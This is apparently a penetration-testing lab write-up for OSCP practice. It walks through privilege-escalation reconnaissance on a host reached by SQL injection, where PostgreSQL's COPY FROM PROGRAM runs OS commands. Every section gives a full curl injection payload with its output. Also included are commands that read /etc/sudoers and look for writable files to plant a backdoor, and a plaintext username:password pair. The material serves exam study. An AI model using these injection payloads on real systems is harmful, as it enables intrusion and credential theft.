# Privilege Escalation Reconnaissance
**Current User**: postgres (UID 106) | **Goal**: Escalate to root

---

## 16. Sudo Privileges Check

### Current Thinking
**Why check sudo?** Fastest privilege escalation path:
- `sudo -l` shows commands we can run as root
- Common misconfigurations: `sudo /bin/bash`, `sudo vim`, `sudo find`
- GTFOBins database: Exploit sudo-allowed binaries

**Expected outcome**:
- Best case: `(ALL : ALL) ALL` (full sudo without password)
- Common case: Specific commands allowed
- Our case: Need password (no sudo access)

**OSCP Reality**: Sudo rarely configured for service accounts like `postgres`.

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'sudo -l 2>&1'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
ERROR: program "sudo -l 2>&1" failed
DETAIL: child process exited with exit code 1
```

**Analysis**:
- ❌ `sudo -l` requires password for `postgres` user
- Exit code 1 = Permission denied
- No passwordless sudo configured
- **Conclusion**: Cannot use sudo for privilege escalation

**OSCP Lesson**: Service accounts rarely have sudo. Move to other vectors.

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
COPY cmd_output FROM PROGRAM 'sudo -l 2>&1';
```

**Breaking down the command**:

1. **`sudo -l`** - List sudo privileges
   - `-l` flag: List allowed commands
   - Shows sudo configuration for current user
   - Requires password OR `NOPASSWD` directive

2. **`2>&1`** - Redirect stderr to stdout
   - **Why needed?** `sudo -l` error messages go to stderr
   - `2` = stderr file descriptor
   - `>&1` = redirect to stdout (file descriptor 1)
   - Without redirect: Error messages lost
   - With redirect: Errors captured in table

**File descriptor concept**:
```
0 = stdin  (input)
1 = stdout (normal output)
2 = stderr (error messages)
```

**Redirection examples**:
```bash
command 2>&1           # stderr → stdout (both captured)
command 2>/dev/null    # Discard errors
command > out.txt 2>&1 # Both to file
```

**Why PostgreSQL failed**:
```
postgres$ sudo -l
[sudo] password for postgres:  ← Waiting for input
[no password provided]
sudo: a password is required
Exit code: 1
```

**Alternative command** (check without password prompt):
```sql
-- Check if sudo binary exists and is executable
COPY cmd_output FROM PROGRAM 'which sudo';
-- Returns: /usr/bin/sudo

-- Check sudoers file (requires root to read)
COPY cmd_output FROM PROGRAM 'cat /etc/sudoers 2>&1';
-- Returns: Permission denied (only root can read)
```

---

## 17. Postgres Home Directory Enumeration

### Current Thinking
**Why check home directory?** May contain:
- Configuration files with credentials
- SSH keys (for lateral movement)
- Bash history (`.bash_history`) with sensitive commands
- Backup files or scripts
- PostgreSQL data directory (for direct DB file manipulation)

**postgres home**: `/var/lib/postgresql` (from /etc/passwd)

**Expected contents**:
- PostgreSQL version directory (e.g., `13/`)
- Configuration files (`.bashrc`, `.profile`)
- Potential SSH keys (`.ssh/id_rsa`)

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'ls -la /var/lib/postgresql'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
total 12
drwxr-xr-x  3 postgres postgres 4096 Jul 18  2022 .
drwxr-xr-x 27 root     root     4096 Jul 18  2022 ..
drwxr-xr-x  3 postgres postgres 4096 Jul 18  2022 13
```

**Analysis**:
- Single directory: `13/` (PostgreSQL version directory)
- No `.ssh/` directory (no SSH keys)
- No `.bash_history` (shell not used interactively)
- Minimal contents (clean installation)

**OSCP Lesson**: Service account home directories often empty (no interactive shell usage).

**Next steps** (if needed):
- Explore `13/` subdirectory: `ls -la /var/lib/postgresql/13`
- Check for PostgreSQL data files
- Look for config backups

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
COPY cmd_output FROM PROGRAM 'ls -la /var/lib/postgresql';
```

**Breaking down `ls -la`**:

1. **`ls`** - List directory contents

2. **`-l`** - Long format (detailed)
   - File permissions (`drwxr-xr-x`)
   - Link count
   - Owner (`postgres`)
   - Group (`postgres`)
   - Size in bytes (`4096`)
   - Modification date (`Jul 18 2022`)
   - File name

3. **`-a`** - Show all files (including hidden)
   - Hidden files start with `.` (`.bashrc`, `.ssh`)
   - Without `-a`: Hidden files not shown
   - Critical for finding SSH keys, bash history

**Permission breakdown**:
```
drwxr-xr-x
│││││││││└─ Execute for others
││││││││└── Write for others (-)
│││││││└─── Read for others
││││││└──── Execute for group
│││││└───── Write for group (-)
││││└────── Read for group
│││└─────── Execute for owner
││└──────── Write for owner
│└───────── Read for owner
└────────── File type (d=directory, -=file, l=symlink)
```

**Why string_agg() with chr(10)?**
- `ls -la` produces multi-line output
- Each line = one file/directory
- `string_agg(output, chr(10))` joins lines with newline
- **`chr(10)`** = newline character (`\n` in ASCII)
- Result: Preserves line breaks in error message

**Alternative**: Without aggregation (first line only)
```sql
SELECT output FROM cmd_output LIMIT 1
-- Returns: "total 12" (just the first line)
```

---

## 18. SUID Binary Enumeration

### Current Thinking
**Why enumerate SUID binaries?** SUID exploitation is common privesc path:
- SUID bit: Binary runs with owner's privileges (usually root)
- Misconfigured SUID: Can execute code as root
- GTFOBins: Database of exploitable SUID binaries

**What we're looking for**:
- Custom/unusual SUID binaries (not standard system tools)
- Vulnerable versions with known exploits
- Misconfigured binaries (vim, find, nmap with SUID)

**Expected**: Standard SUID binaries (`sudo`, `passwd`, `su`)

---

### Command Run
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM 'find / -perm -4000 -type f 2>/dev/null | head -20'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--&age=25&gender=male&email=test@test.com"
```

---

### Result Found
```
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

**Analysis**:
- All standard system SUID binaries
- No custom/unusual binaries
- No immediately exploitable binaries (without credentials)
- **Conclusion**: Standard SUID hardening, no easy privesc

**Standard binaries explained**:
- `sudo`, `su` - Require password
- `passwd`, `chsh`, `chfn` - Change user credentials (require current password)
- `mount`, `umount` - Filesystem operations
- `newgrp`, `gpasswd` - Group management

**OSCP Lesson**: Standard SUID binaries = Look for other vectors (kernel exploits, cron jobs, writable service configs).

---

### Command Anatomy Breakdown

**Injection Payload**:
```sql
COPY cmd_output FROM PROGRAM 'find / -perm -4000 -type f 2>/dev/null | head -20';
```

**Breaking down the command**:

1. **`find /`** - Search from root directory
   - `/` = start at filesystem root
   - Recursive search through all subdirectories
   - Can be slow (entire filesystem scan)

2. **`-perm -4000`** - Find SUID files
   - **`-perm`** = Filter by permissions
   - **`4000`** = SUID bit in octal notation
   - **`-`** prefix = "at least these permissions"
   - SUID bit: File executes with owner's UID

3. **`-type f`** - Files only (not directories)
   - `f` = regular files
   - Excludes: directories (`d`), symlinks (`l`), devices (`c`, `b`)

4. **`2>/dev/null`** - Suppress errors
   - `find` generates errors for restricted directories
   - `/root`: Permission denied
   - `/proc/XXX`: No such file
   - `2>` redirects stderr
   - `/dev/null` = discard output

5. **`| head -20`** - Limit to first 20 results
   - **Why limit?** 100+ SUID files may exist
   - Error message character limits
   - Speeds up command execution
   - First 20 usually include the important ones

**Permission numeric notation**:
```
SUID SGID Sticky | Owner | Group | Other
  4    2     1   |  rwx  |  rwx  |  rwx
                 | 4 2 1 | 4 2 1 | 4 2 1

Example: 4755
├─ 4: SUID bit set
└─ 755: rwxr-xr-x (owner=rwx, group=rx, other=rx)
```

**Alternative find syntax**:
```bash
# Find SGID files (group execution)
find / -perm -2000 -type f 2>/dev/null

# Find files with SUID OR SGID
find / -perm /6000 -type f 2>/dev/null

# Find writable files (for backdoor placement)
find / -writable -type f 2>/dev/null | head -50

# Find world-writable directories (writeable by everyone)
find / -type d -perm -0002 2>/dev/null
```

**Why 2>/dev/null is critical**:
```bash
# Without error suppression:
find / -perm -4000 -type f
find: '/root': Permission denied
find: '/proc/1234/task': No such file or directory
...hundreds of error lines...
/usr/bin/sudo
/usr/bin/passwd

# With error suppression:
find / -perm -4000 -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
```

---

## 🎓 Key Learning Points

### Privilege Escalation Enumeration Order
**OSCP-efficient order**:
1. ✅ **Sudo privileges** - Fastest (GTFOBins exploits)
2. ✅ **SUID binaries** - Fast (GTFOBins exploits)
3. 🔄 **Cron jobs** - Check `/etc/crontab`, `/var/spool/cron/`
4. 🔄 **Writable services** - Systemd units, init scripts
5. 🔄 **Kernel exploits** - Last resort (may crash system)

**Our findings**:
- ❌ Sudo: Requires password
- ❌ SUID: Only standard binaries
- 🔄 Next: Check cron, running processes, kernel version

### Error Handling in Command Execution
**Problem**: Commands may fail (wrong syntax, missing files, permission denied)

**Solutions**:

1. **Redirect stderr to stdout**: `2>&1`
   ```sql
   COPY cmd_output FROM PROGRAM 'sudo -l 2>&1';
   -- Captures error messages in table
   ```

2. **Suppress errors**: `2>/dev/null`
   ```sql
   COPY cmd_output FROM PROGRAM 'find / -name flag.txt 2>/dev/null';
   -- Clean output, no error spam
   ```

3. **Handle exit codes**: PostgreSQL reports non-zero exit codes
   ```
   ERROR: program "sudo -l 2>&1" failed
   DETAIL: child process exited with exit code 1
   ```

### Multi-Line Output Aggregation
**Technique**: `string_agg(output, chr(10))`

**Why needed?**
- Commands like `ls`, `find`, `cat` produce multiple lines
- Each line stored as separate row in table
- Must aggregate for single error message extraction

**Example**:
```sql
-- Without aggregation: Only first line
SELECT output FROM cmd_output LIMIT 1
-- Returns: "/usr/bin/sudo"

-- With aggregation: All lines
SELECT string_agg(output, chr(10)) FROM cmd_output
-- Returns: "/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/passwd\n..."
```

**chr() character codes** (useful in PostgreSQL):
- `chr(10)` = `\n` (newline)
- `chr(9)` = `\t` (tab)
- `chr(32)` = space
- `chr(44)` = comma

---

## ⏱️ Time Tracking (OSCP Exam Planning)

- Sudo check: **2 minutes** (including failure analysis)
- Home directory enum: **2 minutes**
- SUID enumeration: **3 minutes**
- **Total: 7 minutes**
- **Running total: 30 minutes**

**Achievement**: Complete enumeration phase finished in 30 minutes!

**Next phase**:
- Establish reverse shell
- Test SSH with found credentials (`rubben:avrillavigne`)
- Continue privilege escalation enumeration (cron, kernel)
